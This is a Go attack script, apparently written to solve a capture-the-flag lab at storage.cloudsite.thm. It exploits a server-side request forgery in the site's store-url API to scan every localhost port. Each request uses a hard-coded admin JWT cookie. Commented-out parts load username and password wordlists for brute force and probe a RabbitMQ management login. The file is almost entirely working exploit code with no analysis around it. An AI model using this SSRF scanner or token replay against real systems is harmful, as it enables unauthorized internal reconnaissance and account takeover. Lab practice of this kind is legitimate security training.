package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"sync"
)

type Response struct {
	Message string `json:"message"`
	Path    string `json:"path"`
}

var wg sync.WaitGroup
var tokenstr string

// type wlist struct {
// 	username string
// 	password string
// }

// func readList() *[]wlist {
// 	lst := make([]wlist, 0)

// 	f, err := os.OpenFile("pass", os.O_RDONLY, 0644)
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	defer f.Close()

// 	passList := make([]string, 0)
// 	s := bufio.NewScanner(f)
// 	for s.Scan() {
// 		passList = append(passList, s.Text())
// 	}

// 	f2, err := os.OpenFile("username", os.O_RDONLY, 0644)
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	defer f2.Close()

// 	s2 := bufio.NewScanner(f2)
// 	for s2.Scan() {
// 		line := s2.Text()
// 		for _, p := range passList {
// 			lst = append(lst, wlist{username: line, password: p})
// 		}
// 	}

// 	return &lst
// }

func main() {
	var ch = make(chan string)
	wg = sync.WaitGroup{}

	// f, err := os.OpenFile("./schemes", os.O_RDONLY, 0644)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// defer f.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// scanner := bufio.NewScanner(f)

	size := 20
	for range size {
		wg.Add(1)
		go work(ctx, ch)
	}

	go func() {
		for i := range 65536 {
			select {
			case <-ctx.Done():
				close(ch)
				return
			default:
				ch <- fmt.Sprintf("%d", i)
			}
			// break
		}
		close(ch)
	}()

	wg.Wait()
	cancel()
}

func work(ctx context.Context, ch chan string) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		case line, ok := <-ch:
			if !ok {
				return
			}

			action(line)
		}
	}
}

func action(word string) {
	// fmt.Println(word)
	body := bytes.NewBufferString(fmt.Sprintf("{\"url\":\"http://localhost:%s\"}", word))
	req, err := http.NewRequest(http.MethodPost, "http://storage.cloudsite.thm/api/store-url", body)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Cookie", "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGNsb3Vkc2l0ZS50aG0yIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQwNDc0NDA5LCJleHAiOjE3NDA0NzgwMDl9.JIXCNwgyWw8cJSFw9Yic6HZwj6fUKrf7lCULFkVtf2E")
	req.Header.Add("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		// fmt.Println(resp.Status)
		return
	}

	content, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	var respj Response
	if err := json.Unmarshal(content, &respj); err != nil || respj.Path == "" {
		fmt.Println(err)
		if respj.Path == "" {
			fmt.Println("path is nil")
		}
		return
	}

	req2, err := http.NewRequest(http.MethodGet, fmt.Sprintf("http://storage.cloudsite.thm%s", respj.Path), nil)
	if err != nil {
		log.Fatal(err)
	}
	req2.Header.Add("Cookie", "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGNsb3Vkc2l0ZS50aG0yIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQwNDc0NDA5LCJleHAiOjE3NDA0NzgwMDl9.JIXCNwgyWw8cJSFw9Yic6HZwj6fUKrf7lCULFkVtf2E")

	r2, err := http.DefaultClient.Do(req2)
	if err != nil {
		log.Fatal(err)
	}
	defer r2.Body.Close()
	if r2.StatusCode != http.StatusOK {
		return
	}

	t, err := httputil.DumpResponse(r2, true)
	if err != nil {
		log.Fatal(err)
	}

	// fmt.Println(string(t))

	// port 8000
	// The requested URL was not found on the server.

	// port 3000
	// if !bytes.Contains(t, []byte("Cannot GET")) {
	// 	fmt.Println(word)
	// 	fmt.Println(respj.Path)
	// }

	// port 15672
	// if !bytes.Contains(t, []byte("Object Not Found")) && !bytes.Contains(t, []byte("Content-Length: 0")) {
	// 	fmt.Println(word)
	// 	fmt.Println(respj.Path)
	// }

	// if !bytes.Contains(t, []byte("404 Not Found")) && !bytes.Contains(t, []byte("403 Forbidden")) &&
	// 	!bytes.Contains(t, []byte("405 Method Not Allowed")) && !bytes.Contains(t, []byte("Cannot GET ")) {
	// 	fmt.Println(word)
	// 	fmt.Println(respj.Path)
	// }

	// try to login to rabbitmq management UI
	//{"error":"not_authorized","reason":"Login failed"}
	// if !bytes.Contains(t, []byte("Login failed")) {
	// 	fmt.Println(word)
	// 	fmt.Println(respj.Path)
	// }

	//Error storing file from URL
	if !bytes.Contains(t, []byte("Error storing file from URL")) {
		fmt.Printf("%s at %s\n", word, respj.Path)
	}

	// fmt.Print("#")
}

// on port 80
//404 Not Found
//403 Forbidden
// love m
